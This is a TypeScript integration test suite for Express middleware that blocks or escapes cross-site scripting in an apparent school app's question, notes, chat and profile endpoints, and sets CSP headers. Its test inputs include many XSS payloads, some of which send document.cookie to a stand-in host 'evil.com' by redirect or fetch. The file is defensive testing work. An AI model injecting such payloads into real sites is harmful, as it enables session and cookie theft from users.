/**
 * XSS Prevention Middleware Integration Tests
 * 
 * Tests XSS prevention in real Express application scenarios
 * REQ-11.4: System SHALL validate all inputs (max length, SQL injection, XSS)
 */

import { describe, it, expect, beforeAll, afterAll } from 'vitest';
import express, { Express, Request, Response } from 'express';
import request from 'supertest';
import {
  preventXSS,
  preventXSSBody,
  sanitizeXSSBody,
  setXSSHeaders
} from '../xssPrevention.js';

describe('XSS Prevention Integration Tests', () => {
  let app: Express;

  beforeAll(() => {
    app = express();
    app.use(express.json());
    app.use(express.urlencoded({ extended: true }));
  });

  describe('Student Question Submission (Blocking Mode)', () => {
    beforeAll(() => {
      const studentApp = express();
      studentApp.use(express.json());
      
      // Apply XSS prevention middleware
      studentApp.post('/api/student/question', preventXSSBody(), (req: Request, res: Response) => {
        res.json({
          success: true,
          question: req.body.question,
          studentId: req.body.studentId
        });
      });
      
      app = studentApp;
    });

    it('should accept safe question submission', async () => {
      const response = await request(app)
        .post('/api/student/question')
        .send({
          studentId: 'student_123',
          question: 'What is photosynthesis?'
        });

      expect(response.status).toBe(200);
      expect(response.body.success).toBe(true);
      expect(response.body.question).toBe('What is photosynthesis?');
    });

    it('should block question with script tag', async () => {
      const response = await request(app)
        .post('/api/student/question')
        .send({
          studentId: 'student_123',
          question: "<script>alert('XSS')</script>What is photosynthesis?"
        });

      expect(response.status).toBe(400);
      expect(response.body.error).toBe('Invalid input');
      expect(response.body.message).toContain('malicious');
    });

    it('should block question with event handler', async () => {
      const response = await request(app)
        .post('/api/student/question')
        .send({
          studentId: 'student_123',
          question: "<img src=x onerror='alert(1)'>What is photosynthesis?"
        });

      expect(response.status).toBe(400);
      expect(response.body.error).toBe('Invalid input');
    });

    it('should block question with javascript: protocol', async () => {
      const response = await request(app)
        .post('/api/student/question')
        .send({
          studentId: 'student_123',
          question: "Click here: javascript:alert('XSS')"
        });

      expect(response.status).toBe(400);
      expect(response.body.error).toBe('Invalid input');
    });

    it('should block question with iframe', async () => {
      const response = await request(app)
        .post('/api/student/question')
        .send({
          studentId: 'student_123',
          question: "<iframe src='evil.com'></iframe>What is photosynthesis?"
        });

      expect(response.status).toBe(400);
      expect(response.body.error).toBe('Invalid input');
    });
  });

  describe('Teacher Notes Submission (Sanitizing Mode)', () => {
    beforeAll(() => {
      const teacherApp = express();
      teacherApp.use(express.json());
      
      // Apply sanitizing XSS middleware (non-blocking)
      teacherApp.post('/api/teacher/notes', sanitizeXSSBody(), (req: Request, res: Response) => {
        res.json({
          success: true,
          notes: req.body.notes,
          studentId: req.body.studentId
        });
      });
      
      app = teacherApp;
    });

    it('should accept and preserve safe notes', async () => {
      const response = await request(app)
        .post('/api/teacher/notes')
        .send({
          studentId: 'student_123',
          notes: 'Student shows good progress in mathematics'
        });

      expect(response.status).toBe(200);
      expect(response.body.success).toBe(true);
      expect(response.body.notes).toBe('Student shows good progress in mathematics');
    });

    it('should sanitize notes with script tag', async () => {
      const response = await request(app)
        .post('/api/teacher/notes')
        .send({
          studentId: 'student_123',
          notes: "<script>alert('XSS')</script>Good progress"
        });

      expect(response.status).toBe(200);
      expect(response.body.success).toBe(true);
      expect(response.body.notes).toContain('&lt;script&gt;');
      expect(response.body.notes).not.toContain('<script>');
    });

    it('should sanitize notes with event handler', async () => {
      const response = await request(app)
        .post('/api/teacher/notes')
        .send({
          studentId: 'student_123',
          notes: "<img src=x onerror='alert(1)'>Good progress"
        });

      expect(response.status).toBe(200);
      expect(response.body.notes).toContain('&lt;img');
      expect(response.body.notes).not.toContain('<img');
    });

    it('should sanitize HTML entities when XSS detected', async () => {
      const response = await request(app)
        .post('/api/teacher/notes')
        .send({
          studentId: 'student_123',
          notes: "Student's progress: <script>alert(1)</script> & improving"
        });

      expect(response.status).toBe(200);
      expect(response.body.notes).toContain('&lt;script&gt;');
      expect(response.body.notes).toContain('&amp;');
    });
  });

  describe('Combined Middleware (Full Protection)', () => {
    beforeAll(() => {
      const fullApp = express();
      fullApp.use(express.json());
      
      // Apply both XSS prevention and security headers
      fullApp.use(setXSSHeaders());
      fullApp.post('/api/chat', preventXSS(), (req: Request, res: Response) => {
        res.json({
          success: true,
          message: req.body.message
        });
      });
      
      app = fullApp;
    });

    it('should set security headers on response', async () => {
      const response = await request(app)
        .post('/api/chat')
        .send({
          message: 'Hello, how are you?'
        });

      expect(response.headers['x-xss-protection']).toBe('1; mode=block');
      expect(response.headers['x-content-type-options']).toBe('nosniff');
      expect(response.headers['content-security-policy']).toContain("default-src 'self'");
    });

    it('should accept safe messages with security headers', async () => {
      const response = await request(app)
        .post('/api/chat')
        .send({
          message: 'What is the capital of France?'
        });

      expect(response.status).toBe(200);
      expect(response.body.success).toBe(true);
      expect(response.headers['x-xss-protection']).toBeDefined();
    });

    it('should block XSS and still set security headers', async () => {
      const response = await request(app)
        .post('/api/chat')
        .send({
          message: "<script>alert('XSS')</script>"
        });

      expect(response.status).toBe(400);
      expect(response.headers['x-xss-protection']).toBeDefined();
      expect(response.headers['x-content-type-options']).toBeDefined();
    });
  });

  describe('Query Parameter Protection', () => {
    beforeAll(() => {
      const queryApp = express();
      queryApp.use(express.json());
      
      queryApp.get('/api/search', preventXSS(), (req: Request, res: Response) => {
        res.json({
          success: true,
          query: req.query.q,
          filter: req.query.filter
        });
      });
      
      app = queryApp;
    });

    it('should accept safe query parameters', async () => {
      const response = await request(app)
        .get('/api/search')
        .query({ q: 'mathematics', filter: 'recent' });

      expect(response.status).toBe(200);
      expect(response.body.success).toBe(true);
      expect(response.body.query).toBe('mathematics');
    });

    it('should block XSS in query parameters', async () => {
      const response = await request(app)
        .get('/api/search')
        .query({ q: "<script>alert(1)</script>" });

      expect(response.status).toBe(400);
      expect(response.body.error).toBe('Invalid input');
    });

    it('should block javascript: protocol in query', async () => {
      const response = await request(app)
        .get('/api/search')
        .query({ q: "javascript:alert('XSS')" });

      expect(response.status).toBe(400);
      expect(response.body.error).toBe('Invalid input');
    });
  });

  describe('URL Parameter Protection', () => {
    beforeAll(() => {
      const paramApp = express();
      paramApp.use(express.json());
      
      paramApp.get('/api/student/:studentId', preventXSS(), (req: Request, res: Response) => {
        res.json({
          success: true,
          studentId: req.params.studentId
        });
      });
      
      app = paramApp;
    });

    it('should accept safe URL parameters', async () => {
      const response = await request(app)
        .get('/api/student/student_123');

      expect(response.status).toBe(200);
      expect(response.body.success).toBe(true);
      expect(response.body.studentId).toBe('student_123');
    });

    it('should block XSS in URL parameters', async () => {
      // Note: Express URL-encodes special characters in params, so we test with a simpler XSS
      const response = await request(app)
        .get('/api/student/javascript:alert(1)');

      expect(response.status).toBe(400);
      expect(response.body.error).toBe('Invalid input');
    });
  });

  describe('Nested Object Protection', () => {
    beforeAll(() => {
      const nestedApp = express();
      nestedApp.use(express.json());
      
      nestedApp.post('/api/profile', preventXSS(), (req: Request, res: Response) => {
        res.json({
          success: true,
          profile: req.body.profile
        });
      });
      
      app = nestedApp;
    });

    it('should accept safe nested objects', async () => {
      const response = await request(app)
        .post('/api/profile')
        .send({
          profile: {
            name: 'John Doe',
            bio: 'Student interested in science',
            metadata: {
              tags: ['math', 'physics'],
              notes: 'Excellent student'
            }
          }
        });

      expect(response.status).toBe(200);
      expect(response.body.success).toBe(true);
    });

    it('should block XSS in nested objects', async () => {
      const response = await request(app)
        .post('/api/profile')
        .send({
          profile: {
            name: 'John Doe',
            bio: "<script>alert('XSS')</script>",
            metadata: {
              tags: ['math', 'physics']
            }
          }
        });

      expect(response.status).toBe(400);
      expect(response.body.error).toBe('Invalid input');
      expect(response.body.field).toContain('bio');
    });

    it('should block XSS in deeply nested objects', async () => {
      const response = await request(app)
        .post('/api/profile')
        .send({
          profile: {
            name: 'John Doe',
            metadata: {
              tags: ['math', 'physics'],
              notes: "<img src=x onerror='alert(1)'>"
            }
          }
        });

      expect(response.status).toBe(400);
      expect(response.body.error).toBe('Invalid input');
    });
  });

  describe('Array Protection', () => {
    beforeAll(() => {
      const arrayApp = express();
      arrayApp.use(express.json());
      
      arrayApp.post('/api/messages', preventXSS(), (req: Request, res: Response) => {
        res.json({
          success: true,
          messages: req.body.messages
        });
      });
      
      app = arrayApp;
    });

    it('should accept safe arrays', async () => {
      const response = await request(app)
        .post('/api/messages')
        .send({
          messages: [
            'Hello',
            'How are you?',
            'What is photosynthesis?'
          ]
        });

      expect(response.status).toBe(200);
      expect(response.body.success).toBe(true);
    });

    it('should block XSS in arrays', async () => {
      const response = await request(app)
        .post('/api/messages')
        .send({
          messages: [
            'Hello',
            "<script>alert('XSS')</script>",
            'What is photosynthesis?'
          ]
        });

      expect(response.status).toBe(400);
      expect(response.body.error).toBe('Invalid input');
    });

    it('should block XSS in nested arrays', async () => {
      const response = await request(app)
        .post('/api/messages')
        .send({
          messages: [
            ['Hello', 'World'],
            ['Safe', "<iframe src='evil.com'></iframe>"]
          ]
        });

      expect(response.status).toBe(400);
      expect(response.body.error).toBe('Invalid input');
    });
  });

  describe('Real-world Attack Scenarios', () => {
    beforeAll(() => {
      const attackApp = express();
      attackApp.use(express.json());
      attackApp.use(setXSSHeaders());
      attackApp.post('/api/submit', preventXSS(), (req: Request, res: Response) => {
        res.json({
          success: true,
          data: req.body
        });
      });
      
      app = attackApp;
    });

    it('should block reflected XSS attack', async () => {
      const response = await request(app)
        .post('/api/submit')
        .send({
          input: "<script>document.location='http://evil.com?c='+document.cookie</script>"
        });

      expect(response.status).toBe(400);
    });

    it('should block stored XSS attack', async () => {
      const response = await request(app)
        .post('/api/submit')
        .send({
          comment: "<img src=x onerror='fetch(\"http://evil.com?c=\"+document.cookie)'>"
        });

      expect(response.status).toBe(400);
    });

    it('should block DOM-based XSS attack', async () => {
      const response = await request(app)
        .post('/api/submit')
        .send({
          input: "<img src=x onerror='eval(atob(\"YWxlcnQoMSk=\"))'>"
        });

      expect(response.status).toBe(400);
    });

    it('should block SVG-based XSS attack', async () => {
      const response = await request(app)
        .post('/api/submit')
        .send({
          input: "<svg onload='alert(1)'>"
        });

      expect(response.status).toBe(400);
    });

    it('should block data URI XSS attack', async () => {
      const response = await request(app)
        .post('/api/submit')
        .send({
          input: "data:text/html,<script>alert(1)</script>"
        });

      expect(response.status).toBe(400);
    });

    it('should block meta refresh XSS attack', async () => {
      const response = await request(app)
        .post('/api/submit')
        .send({
          input: "<meta http-equiv='refresh' content='0;url=javascript:alert(1)'>"
        });

      expect(response.status).toBe(400);
    });

    it('should block style expression XSS attack', async () => {
      const response = await request(app)
        .post('/api/submit')
        .send({
          input: "<div style='width:expression(alert(1))'>test</div>"
        });

      expect(response.status).toBe(400);
    });
  });

  describe('Content Security Policy Headers', () => {
    beforeAll(() => {
      const cspApp = express();
      cspApp.use(express.json());
      cspApp.use(setXSSHeaders());
      cspApp.get('/api/test', (req: Request, res: Response) => {
        res.json({ success: true });
      });
      
      app = cspApp;
    });

    it('should set CSP header with default-src self', async () => {
      const response = await request(app).get('/api/test');

      expect(response.headers['content-security-policy']).toContain("default-src 'self'");
    });

    it('should set CSP header with script-src restrictions', async () => {
      const response = await request(app).get('/api/test');

      expect(response.headers['content-security-policy']).toContain("script-src 'self'");
    });

    it('should set CSP header with style-src restrictions', async () => {
      const response = await request(app).get('/api/test');

      expect(response.headers['content-security-policy']).toContain("style-src 'self'");
    });

    it('should set CSP header with frame-ancestors none', async () => {
      const response = await request(app).get('/api/test');

      expect(response.headers['content-security-policy']).toContain("frame-ancestors 'none'");
    });
  });

  describe('Performance with Large Payloads', () => {
    beforeAll(() => {
      const perfApp = express();
      perfApp.use(express.json({ limit: '10mb' }));
      perfApp.post('/api/large', preventXSS(), (req: Request, res: Response) => {
        res.json({ success: true, size: JSON.stringify(req.body).length });
      });
      
      app = perfApp;
    });

    it('should handle large safe payloads efficiently', async () => {
      const largePayload = {
        items: Array(1000).fill(null).map((_, i) => ({
          id: `item_${i}`,
          name: `Item ${i}`,
          description: 'This is a safe description for the item'
        }))
      };

      const startTime = Date.now();
      const response = await request(app)
        .post('/api/large')
        .send(largePayload);
      const endTime = Date.now();

      expect(response.status).toBe(200);
      expect(endTime - startTime).toBeLessThan(5000); // Should complete within 5 seconds
    });

    it('should detect XSS in large payloads', async () => {
      const largePayload = {
        items: Array(1000).fill(null).map((_, i) => ({
          id: `item_${i}`,
          name: i === 500 ? "<script>alert(1)</script>" : `Item ${i}`,
          description: 'This is a safe description'
        }))
      };

      const response = await request(app)
        .post('/api/large')
        .send(largePayload);

      expect(response.status).toBe(400);
      expect(response.body.error).toBe('Invalid input');
    });
  });
});
